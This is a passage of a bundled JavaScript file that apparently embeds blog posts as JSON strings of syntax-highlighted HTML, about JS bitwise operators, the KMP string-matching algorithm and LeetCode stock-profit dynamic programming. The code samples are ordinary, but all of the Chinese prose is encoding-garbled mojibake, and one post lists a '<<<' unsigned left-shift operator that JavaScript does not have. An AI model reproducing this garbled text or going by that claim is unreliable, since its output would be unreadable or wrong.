class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">x</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-built_in\\">parseInt</span>(<span class=\\"hljs-string\\">\'1234\'</span>);\\n  <span class=\\"hljs-keyword\\">var</span> b=<span class=\\"hljs-string\\">\'1234\'</span>;\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">double</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> n*<span class=\\"hljs-number\\">2</span>\\n  }\\n  <span class=\\"hljs-keyword\\">var</span> c=double...</code></pre>","slug":"JS-de-AST(Esprima.parse)","sha":"8446b12b208921dadb0f44d47ca83eb637509139"}')},556:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"js-an-wei-cao-zuo-fu\\">JSæŒ‰ä½æ“ä½œç¬¦</h2>\\n<ul>\\n<li><p>æŒ‰ä½å¼‚æˆ–(^)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…ç›¸åŒï¼Œåˆ™ä¸º0ï¼Œä¸¤è€…ä¸åŒï¼Œåˆ™ä¸º1</p>\\n</li>\\n<li><p>æŒ‰ä½ä¸ (&amp;)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…éƒ½ä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0</p>\\n</li>\\n<li><p>æŒ‰ä½æˆ– (|)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…å…¶ä¸­ä¸€ä¸ªä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0</p>\\n</li>\\n<li><p>æŒ‰ä½é(~)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½çš„åç ï¼Œ1ä¸º0ï¼Œ0ä¸º1ï¼ˆåè¿›åˆ¶æ•°å€¼çš„è´Ÿæ•°-1ï¼‰</p>\\n</li>\\n<li><p>å·¦ç§»(&lt;&lt;) å³ç§»(&gt;&gt;)ï¼šè½¬æ¢æˆ32ä½äºŒè¿›åˆ¶ç¼–ç åè¿›è¡Œç§»ä½ï¼Œå…¶ä¸­æœ€å·¦ä¾§ä½ä¸ºç¬¦å·ä½ï¼Œæ•°å­—åªå ç”¨31ä½</p>\\n<p>  å¯¹Math.pow(2,31)-1ä»¥å†…çš„æ•°å€¼ï¼Œç¬¦åˆä»¥ä¸‹ç­‰å¼\\n  <code>n&gt;&gt;m===parseInt(n/Math.pow(2,m))</code></p>\\n</li>\\n</ul>\\n<ul>\\n<li><p>æ— ç¬¦å·å³ç§»(&gt;&gt;&gt;) æ— ç¬¦å·å·¦ç§»(&lt;&lt;&lt;)ï¼šè½¬æ¢æˆ32ä½äºŒè¿›åˆ¶ç¼–ç åè¿›è¡Œç§»ä½ï¼Œæ— ç¬¦å·ä½</p>\\n<p>  å¯¹Math.pow(2,32)-1ä»¥å†…çš„æ•°å€¼ç¬¦åˆä»¥ä¸‹ç­‰å¼\\n  <code>n&gt;&gt;&gt;m===parseInt(n/Math.pow(2,m))</code></p>\\n</li>\\n</ul>\\n<h2 id=\\"shi-yong\\">ä½¿ç”¨</h2>\\n<ol>\\n<li><p>Hamming distance(æµ·æ˜è·ç¦»)</p>\\n<p> å½“ä¸¤ä¸ªäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œå¯¹åº”ä½æ•°ä¸åŒçš„æ¬¡æ•°</p>\\n<p> ä¾‹å¦‚ï¼š10001å’Œ11000ï¼Œå…¶ä¸­ç¬¬2ï¼Œ5ä½ä¸åŒï¼Œæµ·æ˜è·ç¦»ä¸º2</p>\\n<p> è®¡ç®—æ–¹å¼ï¼šå¯ç”¨^ï¼ˆå¼‚æˆ–ï¼‰ï¼Œç„¶åè®¡ç®—1çš„æ¬¡æ•°</p>\\n</li>\\n<li><p>åˆ¤æ–­æŸä¸ªæ•°å­—çš„äºŒè¿›åˆ¶æ ¼å¼æœ‰å¤šå°‘ä¸ª1</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcBitSet</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n<span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>,tmp=n\\n<span class=\\"hljs-keyword\\">while</span>(tmp){\\n count++;\\n <span class=\\"hljs-comment\\">// æ¯æ¬¡æ‰§è¡Œéƒ½ä¼šæ¶ˆé™¤æœ€åä¸€ä¸ª1</span>\\n tmp = tmp &amp; (tmp - <span class=\\"hljs-number\\">1</span>);\\n}\\n<span class=\\"hljs-keyword\\">return</span> count\\n}</code></pre></code></pre>\\n</li>\\n</ol>\\n","toc":[{"anchor":"js-an-wei-cao-zuo-fu","level":2,"text":"JSæŒ‰ä½æ“ä½œç¬¦"},{"anchor":"shi-yong","level":2,"text":"ä½¿ç”¨"}],"relatedTags":null,"created_at":"2018-07-03","timeArr":[2018,6,3,0,0,0,0],"title":"JSä¸­ä½æ“ä½œ","uuid":"18afb8f32bc7fc0b2ce146673e4998010db08a12","summary":"<h4>JSæŒ‰ä½æ“ä½œç¬¦</h4>\\n<ul>\\n<li>æŒ‰ä½å¼‚æˆ–(^)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…ç›¸åŒï¼Œåˆ™ä¸º0ï¼Œä¸¤è€…ä¸åŒï¼Œåˆ™ä¸º1</li>\\n<li>æŒ‰ä½ä¸ (&amp;)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…éƒ½ä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0</li>\\n<li>æŒ‰ä½æˆ– (|)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½ä¸¤è€…å…¶ä¸­ä¸€ä¸ªä¸º1ï¼Œåˆ™ä¸º1ï¼Œå¦åˆ™ï¼Œåˆ™ä¸º0</li>\\n<li>æŒ‰ä½é(~)ï¼šäºŒè¿›åˆ¶ç¼–ç ä¸­ï¼Œæ¯ä¸€ä½çš„åç ï¼Œ1ä¸º0ï¼Œ0ä¸º1ï¼ˆåè¿›...</li>\\n</ul>","slug":"JS-zhong-wei-cao-zuo","sha":"50c40330555ea317421cc46a84ff4b6fe23f1cc1"}')},557:function(n){n.exports=JSON.parse('{"content":"<p>KMPç®—æ³•ä¸­ï¼Œå½“å¯¹åº”çš„å­—ç¬¦ä¸åŒ¹é…æ—¶ï¼Œéœ€è¦å¯¹å‰ä¸€ä¸ªç´¢å¼•è¿›è¡Œå›æº¯</p>\\n<p>ä¸€èˆ¬å†™æ³•æ˜¯ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">if</span>(str[k]!==str[j]){\\n    <span class=\\"hljs-comment\\">// æœ‰äº›ä¼šå†™æˆk=next[k]ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„</span>\\n    <span class=\\"hljs-comment\\">// è¿™é‡Œkè¡¨ç¤ºï¼Œæ‰€å¯¹åº”å½“å‰æ­£åœ¨è¿›è¡Œå¯¹æ¯”çš„ç´¢å¼•</span>\\n    <span class=\\"hljs-comment\\">// k=next[k-1]è¡¨ç¤ºæ‰¾åˆ°kçš„å‰ä¸€ä½çš„å…¬å…±åŒ¹é…å‰åç¼€çš„æ•°é‡ï¼Œä½œä¸ºæ–°çš„å¯¹æ¯”ç´¢å¼•</span>\\n    k=next[k<span class=\\"hljs-number\\">-1</span>]\\n  }\\n}</code></pre></code></pre>\\n<p><img src=\\"/article/img/KPM%E5%9B%BE%E8%A7%A3.png\\" alt=\\"\\"></p>\\n<p>å›¾ä¸­ï¼Œå½“Kå’ŒJä¸èƒ½åŒ¹é…æ—¶ï¼ŒAå’ŒBæ˜¯å·²ç»åŒ¹é…çš„å…¬å…±å‰åç¼€</p>\\n<p>å› æ­¤Aå’ŒBæ˜¯å®Œå…¨ç›¸ç­‰</p>\\n<p>Aå†…éƒ¨çš„A1,A2æ˜¯å·²ç»åŒ¹é…çš„å…¬å…±å‰åç¼€</p>\\n<p>Bå†…éƒ¨çš„B1,B2æ˜¯å·²ç»åŒ¹é…çš„å…¬å…±å‰åç¼€</p>\\n<p>å› æ­¤A1===A2===B1===B2</p>\\n<p>è¦æƒ³æ‰¾åˆ°å¯èƒ½å’ŒJåŒ¹é…çš„æœ€å¤§å…¬å…±å‰åç¼€ï¼Œåªèƒ½æ‰¾Açš„å‰ç¼€(å› ä¸ºAçš„åç¼€è¿ç€kï¼Œè€Œkä¸ç›¸ç­‰ï¼Œæ‰€ä»¥kä¸èƒ½ç”¨äº†ï¼Œåªèƒ½æ‰¾å®ƒå‰é¢çš„)ï¼Œä¸Jè¿›è¡Œæ¯”è¾ƒ</p>\\n<p>ä¹Ÿå°±æ˜¯ä»<code>next[k-1]</code>å¼€å§‹åŒ¹é…</p>\\n<p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>,k=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> next=[]\\n  next[<span class=\\"hljs-number\\">0</span>]=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">while</span>(i &lt; str.length){\\n    <span class=\\"hljs-comment\\">// ä¸ç›¸ç­‰æ—¶</span>\\n    <span class=\\"hljs-keyword\\">if</span>(str[i]!==str[k]){\\n      <span class=\\"hljs-comment\\">// å¦‚æœkå·²ç»æ˜¯0äº†(æœ€å°å°±æ˜¯0)ï¼Œç›´æ¥è®¾ç½®æˆ0</span>\\n      <span class=\\"hljs-keyword\\">if</span>(k===<span class=\\"hljs-number\\">0</span>)next[i++]=k\\n        <span class=\\"hljs-comment\\">// å¦åˆ™å°±å›æº¯åˆ°å‰ä¸€ä¸ªå…¬å…±å‰ç¼€çš„ä½ç½®</span>\\n      <span class=\\"hljs-keyword\\">else</span> {\\n        k=next[k<span class=\\"hljs-number\\">-1</span>]\\n      }\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-comment\\">// ç›¸ç­‰ï¼Œå°±ç›´æ¥åœ¨kçš„ç´¢å¼•ä¸Š+1ï¼Œè¡¨ç¤ºåŒ¹é…çš„length</span>\\n      next[i]=k+<span class=\\"hljs-number\\">1</span>\\n      i++;\\n      k++;\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> next\\n}\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">kpm</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(pat.length===<span class=\\"hljs-number\\">0</span>) <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">let</span> next=calcNext(pat)\\n  <span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>,j=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">while</span>(i&lt;str.length ){\\n    <span class=\\"hljs-keyword\\">if</span>(str[i]===pat[j]){\\n      i++;j++\\n      <span class=\\"hljs-comment\\">// j===pat.lengthè¯´æ˜å·²ç»åŒ¹é…æˆåŠŸ</span>\\n      <span class=\\"hljs-keyword\\">if</span>(j===pat.length) <span class=\\"hljs-keyword\\">return</span> i-j\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-keyword\\">if</span>(j===<span class=\\"hljs-number\\">0</span>){\\n        i++\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        j=next[j<span class=\\"hljs-number\\">-1</span>]\\n      }\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">-1</span>\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-09","timeArr":[2018,7,9,0,0,0,0],"title":"KMPå›æº¯åˆ†æ","uuid":"d19b06a421c09a6a7e3d012ce39d42cf0cfc380b","summary":"<p>KMPç®—æ³•ä¸­ï¼Œå½“å¯¹åº”çš„å­—ç¬¦ä¸åŒ¹é…æ—¶ï¼Œéœ€è¦å¯¹å‰ä¸€ä¸ªç´¢å¼•è¿›è¡Œå›æº¯</p>\\n<p>ä¸€èˆ¬å†™æ³•æ˜¯ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">calcNext</span>(<span class=\\"hljs-params\\">str,pat</span>)</span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-keyword\\">if</span>(str[k]!==str[j]){\\n    <span class=\\"hljs-comment\\">// æœ‰äº›ä¼šå†™æˆk=next[k]ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„</span>\\n    <span class=\\"hljs-comment\\">// è¿™é‡Œkè¡¨ç¤ºï¼Œæ‰€å¯¹åº”å½“å‰æ­£åœ¨è¿›è¡Œå¯¹æ¯”çš„...</span></code></pre>","slug":"KMP-hui-su-fen-xi","sha":"dcb12fd298b9d963db9b1d4b12cbff7da94227bc"}')},558:function(n){n.exports=JSON.parse('{"content":"<p><code>Leetcode</code>ä¸Šæœ‰ä¸€ç³»åˆ—ç±»ä¼¼çš„é¢˜ç›®ï¼Œçœ‹äº†å‡ ä½å¤§ç¥çš„ç­”æ¡ˆï¼Œæ„Ÿè§‰è¿™ç±»é¢˜ç›®éƒ½èƒ½å¥—ç”¨ï¼Œéƒ½æ˜¯DP(åŠ¨æ€è§„åˆ’)çš„æ€è·¯ã€‚</p>\\n<p>é¢˜ç›®1ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥å¤šæ¬¡äº¤æ˜“ï¼Œä½†åŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>6-1 + 8-0</code>=13</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      sell=prev_buy+prices[i]\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>è™½ç„¶å¯¹äºè¿™é“é¢˜ï¼Œæœ‰ä¸€ç§è§£æ³•æ›´ç®€å•ï¼Œå°±æ˜¯åªè¦<code>prices[i]-pries[i-1]</code>æ˜¯æ­£æ•°ï¼Œå°±ç®—åˆ°profité‡Œé¢ã€‚</p>\\n<p>ä½†ä¸Šé¢çš„æ˜¯ä¸€ç§æ¨¡å¼ï¼Œå¯¹äºæ­¤ç§ç±»å‹çš„é¢˜ï¼Œéƒ½å¯ä»¥å¥—ç”¨è¿™å¥—æ¨¡å¼ã€‚</p>\\n<p>æ€è·¯ï¼š</p>\\n<ol>\\n<li>æ¯ä¸€å¤©éƒ½æœ‰å¯èƒ½3ç§è¡ŒåŠ¨ï¼Œsell, buy, rest(ä»€ä¹ˆéƒ½ä¸åš)ã€‚</li>\\n<li>å¦‚æœç¬¬iå¤©æ˜¯sellï¼Œé‚£ä¹ˆå®ƒçš„å‰é¢ä¸€å®šå·²ç»ä¹°äº†(buy)ï¼Œ<code>sell=prev_buy+prices[i]</code></li>\\n<li>å¦‚æœç¬¬iå¤©æ˜¯buyï¼Œé‚£ä¹ˆå®ƒçš„å‰é¢æœ‰å¯èƒ½åˆšå–å‡ºå»ï¼Œ<code>prev_sell-prices[i]</code>ï¼Œ\\næœ‰å¯èƒ½æ˜¯ä¼‘æ¯ï¼Œ<code>prev_rest-prices[i]</code>,ä¹Ÿæœ‰å¯èƒ½æ˜¯ä¿æŒä¹°çš„çŠ¶æ€ï¼Œ<code>prev_buy</code>ï¼Œä¾‹å¦‚<code>1,2,3</code>ï¼Œå°±æ˜¯ä¹°äº†1,åˆ°äº†3æ‰å–ã€‚</li>\\n<li>å¦‚æœç¬¬iå¤©æ˜¯restï¼Œé‚£ä¹ˆå®ƒå‰é¢æœ‰å¯èƒ½ï¼Œä¹°ã€å–ã€ä¼‘æ¯ï¼Œä½†å‰é¢æ˜¯ä¹°ä¸€å®šä¼šå°ï¼Œæ‰€ä»¥<code>Math.max(prev_rest,prev_sell)</code></li>\\n</ol>\\n<p>æœ€ååªè¦æ¯”è¾ƒæœ€åä¸€å¤©çš„è¡ŒåŠ¨æ˜¯å–å‡ºè¿˜æ˜¯ä¼‘æ¯ï¼Œæ¯”è¾ƒå“ªä¸ªæ›´å¤§å°±æ˜¯æœ€å¤§æ”¶ç›Šã€‚</p>\\n<p>é¢˜ç›®2ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥å¤šæ¬¡äº¤æ˜“ï¼Œä½†åŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œå¹¶ä¸”æ¯æ¬¡äº¤æ˜“å®Œæˆæœ‰æ‰‹ç»­è´¹ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code>ï¼Œæ‰‹ç»­è´¹æ˜¯<code>6</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>8-0-6</code>=2</p>\\n<p>ç›´æ¥å¥—æ¨¡æ¿ï¼Œæ¯æ¬¡sellè¦æ‰£å»æ‰‹ç»­è´¹ä¾¿å¯</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices,fee</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      <span class=\\"hljs-comment\\">// è¿™é‡ŒåŠ äº†fee</span>\\n      sell=prev_buy+prices[i]-fee\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>é¢˜ç›®3ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥å¤šæ¬¡äº¤æ˜“ï¼Œä½†åŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œå¹¶ä¸”æ¯æ¬¡äº¤æ˜“å®Œæˆå¿…é¡»ä¼‘æ¯ä¸€å¤©ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>6-1 + 8-3</code>=10</p>\\n<p>å¥—æ¨¡æ¿ï¼Œåªæ˜¯ä¹°çš„é‚£ä¸€å¤©ä¹‹å‰ä¸èƒ½æ˜¯å–å‡ºï¼Œå¿…é¡»æ˜¯ä¼‘æ¯æˆ–è€…ä¿æŒä¹°çš„çŠ¶æ€ã€‚</p>\\n<p><code>buy=Math.max(prev_rest-prices[i],prev_buy,prev_sell-prices[i])</code></p>\\n<p><code>---&gt;</code></p>\\n<p><code>buy=Math.max(prev_rest-prices[i],prev_buy)</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> prev_sell,prev_buy,prev_rest,\\n      sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>],rest=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n      prev_buy=buy;prev_rest=rest;prev_sell=sell\\n      sell=prev_buy+prices[i]\\n      <span class=\\"hljs-comment\\">// æ­¤å¤„ä¸èƒ½æ˜¯å–å‡ºåç«‹åˆ»ä¹°</span>\\n      buy=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest-prices[i],prev_buy)\\n      rest=<span class=\\"hljs-built_in\\">Math</span>.max(prev_rest,prev_sell)\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(sell,rest)\\n}</code></pre></code></pre>\\n<p>é¢˜ç›®4ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥äº¤æ˜“1æ¬¡ï¼ŒåŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>0 ä¹° 8å–</code>=8</p>\\n<p>å› ä¸ºè¿™é‡Œåªèƒ½äº¤æ˜“1æ¬¡ï¼Œæˆ‘ä»¬ä¸ç”¨å®šä¹‰ä¹‹å‰çš„æƒ…å†µ<code>prev_buy</code>,<code>prev_rest</code>,<code>prev_sell</code></p>\\n<p>åªéœ€è¦å®šä¹‰ä¸€ä¸ªä¹°å…¥ï¼Œä¸€ä¸ªå–å‡ºä¾¿å¯ã€‚</p>\\n<p>ä»£ç å¦‚ä¸‹ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> sell=<span class=\\"hljs-number\\">0</span>,buy=-prices[<span class=\\"hljs-number\\">0</span>]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n        sell=<span class=\\"hljs-built_in\\">Math</span>.max(buy+prices[i],sell)\\n        buy=<span class=\\"hljs-built_in\\">Math</span>.max(-prices[i],buy)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> sell\\n}</code></pre></code></pre>\\n<p>é¢˜ç›®5ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥æœ€å¤šäº¤æ˜“2æ¬¡ï¼ŒåŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>1ä¹° 6å–+0ä¹° 8å–</code>=13</p>\\n<p>åŒä¸Šä¸€é¢˜ï¼Œè¿™é‡Œæœ€å¤šäº¤æ˜“2æ¬¡ï¼Œå› æ­¤ä¸éœ€è¦å®šä¹‰<code>prev</code>æƒ…å†µ</p>\\n<p>åªéœ€è¦å®šä¹‰2ä¸ªä¹°å…¥ï¼Œ2ä¸ªå–å‡ºä¾¿å¯ã€‚</p>\\n<p>ä»£ç å¦‚ä¸‹ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxProfit</span>(<span class=\\"hljs-params\\">prices</span>)</span>{\\n    <span class=\\"hljs-keyword\\">let</span> sell1=<span class=\\"hljs-number\\">0</span>,buy1=-prices[<span class=\\"hljs-number\\">0</span>],sell2=<span class=\\"hljs-number\\">0</span>,buy2=-prices[<span class=\\"hljs-number\\">0</span>]\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;prices.length;i++){\\n        sell1=<span class=\\"hljs-built_in\\">Math</span>.max(buy1+prices[i],sell1)\\n        buy1=<span class=\\"hljs-built_in\\">Math</span>.max(buy1,-prices[i])\\n        sell2=<span class=\\"hljs-built_in\\">Math</span>.max(buy2+prices[i],sell2)\\n        buy2=<span class=\\"hljs-built_in\\">Math</span>.max(-prices[i]+sell1,buy2)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> sell2\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-19","timeArr":[2018,9,19,0,0,0,0],"title":"LeetCodeè·å–æœ€å¤§æ”¶ç›Šçš„ç®—æ³•","uuid":"4483d4ae741e5f281dba7c87dd850e305a2b0565","summary":"<p><code>Leetcode</code>ä¸Šæœ‰ä¸€ç³»åˆ—ç±»ä¼¼çš„é¢˜ç›®ï¼Œçœ‹äº†å‡ ä½å¤§ç¥çš„ç­”æ¡ˆï¼Œæ„Ÿè§‰è¿™ç±»é¢˜ç›®éƒ½èƒ½å¥—ç”¨ï¼Œéƒ½æ˜¯DP(åŠ¨æ€è§„åˆ’)çš„æ€è·¯ã€‚</p>\\n<p>é¢˜ç›®1ï¼š</p>\\n<p>ç»™å‡ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºç¬¬<code>i</code>å¤©çš„ä»·æ ¼ã€‚</p>\\n<p>ä½ å¯ä»¥å¤šæ¬¡äº¤æ˜“ï¼Œä½†åŒä¸€å¤©åªèƒ½äº¤æ˜“1æ¬¡ï¼Œæ±‚äº¤æ˜“è·å–æœ€å¤§å€¼ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š<code>[1,6,0,3,4,8,2]</code></p>\\n<p>æœ€å¤§æ”¶ç›Šä¸ºï¼š<code>6-1 + 